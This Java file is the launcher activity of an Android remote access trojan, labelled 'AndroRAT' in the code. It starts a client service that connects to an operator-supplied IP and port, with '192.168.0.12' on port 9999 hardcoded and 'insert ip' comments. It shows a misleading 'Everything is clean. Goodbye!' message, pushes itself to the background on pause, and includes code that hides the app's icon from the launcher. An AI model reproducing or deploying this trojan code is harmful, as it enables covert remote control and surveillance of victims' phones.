package my.app.client;

import my.app.client.R;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.StrictMode;
import android.text.InputFilter.LengthFilter;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import static android.R.attr.enabled;

public class LauncherActivity extends Activity {
	private static final String TAG = "AndroRAT";
	Intent Client, ClientAlt;
	Button btnStart, btnStop;
	EditText ipfield, portfield;
	String myIp = "192.168.0.12"; //insert ip.
	int myPort = 9999; //remove quotes and insert port.
	Context ctx = this;

	@Override
	public void onStart() {
		super.onStart();

	}

	@Override
	public void onResume() {
		super.onResume();

	}

	public void onPause() {
		super.onPause();
		Log.i(TAG, "hey");
		moveTaskToBack(false);

	}

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		btnStart = (Button) findViewById(R.id.buttonstart);
		btnStop = (Button) findViewById(R.id.buttonstop);
		ipfield = (EditText) findViewById(R.id.ipfield);
		portfield = (EditText) findViewById(R.id.portfield);

		btnStart.setEnabled(true);
		btnStop.setEnabled(false);
	}

	public void onClickBtn(View v) throws InterruptedException {
		btnStart.setEnabled(false);
		btnStop.setEnabled(true);

		Client = new Intent(this, Client.class);
		Client.setAction(LauncherActivity.class.getName());

		Client.putExtra("IP", ipfield.getText().toString());
		Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()));

		startService(Client);
		setComponentState(ctx,"my.app.client","LauncherActivity", true);
		ProgressBar pb = (ProgressBar) findViewById(R.id.progressBar1);
		pb.setVisibility(View.VISIBLE);
		Thread.sleep(5000);
		Toast.makeText(getApplicationContext(), "Everything is clean. Goodbye!...", Toast.LENGTH_LONG).show();
		onBackPressed();
	}

	private void hideApplication() {
		/* nasconde l'icona dal drawer dopo il primo avvio */
		PackageManager pm = getApplicationContext().getPackageManager();
		pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);

	}

	public void onStopClick(View v) throws InterruptedException {
		btnStart.setEnabled(true);
		btnStop.setEnabled(false);

		stopService(Client);
		Client = null;
		setComponentState(ctx,"my.app.client","LauncherActivity", false);
		Toast.makeText(getApplicationContext(), "Everything is clean. Goodbye!...", Toast.LENGTH_LONG).show();

	}

	public static void setComponentState(Context context, String packageName , String componentClassName,boolean enabled)
	{
		PackageManager pm  = context.getApplicationContext().getPackageManager();
		ComponentName componentName = new ComponentName(packageName, componentClassName);
		int state = enabled ?  PackageManager.COMPONENT_ENABLED_STATE_ENABLED :  PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
		pm.setComponentEnabledSetting(componentName,
				state,
				PackageManager.DONT_KILL_APP);
	}
}
